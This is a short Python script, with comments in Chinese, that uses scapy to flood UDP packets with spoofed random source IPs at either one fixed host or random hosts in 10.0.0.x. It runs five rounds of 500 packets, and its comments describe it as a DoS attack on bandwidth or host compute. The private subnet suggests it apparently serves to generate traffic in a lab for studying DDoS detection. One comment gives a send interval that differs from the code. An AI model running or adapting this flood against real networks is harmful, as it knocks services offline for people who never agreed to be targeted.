#coding=utf-8
import sys
import time
import getopt
from os import popen
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import sendp, IP, UDP, Ether
from random import randrange

#生成范围为10.0.0.start——10.0.0.end范围内的ip地址
def generateSourceIP(start, end):
    first = 10
    second = 0
    third = 0

    ip = ".".join([str(first), str(second), str(third), str(randrange(start,end))])
    return ip

def generateDestinationIP(start, end):
    first = 10
    second = 0
    third = 0

    ip = ".".join([str(first), str(second), str(third), str(randrange(start,end))])
    return ip

def main(argv):
    #获取启动参数，start，end用于控制生成ip地址的范围，fixed设置目标ip地址是否固定
    try:
        opts, args = getopt.getopt(sys.argv[1:], 's:e:f:', ['start=','end=','fixed='])
    except getopt.GetoptError:
        sys.exit(-1)

    for opt, arg in opts:
        if opt =='-s':
            start = int(arg)
        elif opt =='-e':
            end = int(arg)
        elif opt =='-f':
            fixed = bool(int(arg))

    if start == '' or end == '' or fixed == '':
        sys.exit(-1)

    #总共5轮攻击，每轮Dos攻击500次
    for i in range (1, 5):
        interface = popen('ifconfig | awk \'/eth0/ {print $1}\'').read()
        #获取本机网卡接口，sendp发包通过该接口实现
        for i in xrange(0, 500):
            if(fixed == True):
                desIp = "10.0.0.64"
            else:
                desIp = generateDestinationIP(start, end)
            packets = Ether() / IP(dst = desIp, src = generateSourceIP(start,end)) / UDP(dport = 1, sport = 80)
            #如果是链路带宽攻击，则设值目标ip地址随机，如果是对主机计算资源攻击，则设值目标ip地址固定
            print(repr(packets))
            sendp(packets, iface = interface.rstrip(), inter = 0.001)
            #发送间隔为0.025秒，用于模拟请求泛洪
        time.sleep (10)

if __name__=="__main__":
    main(sys.argv)
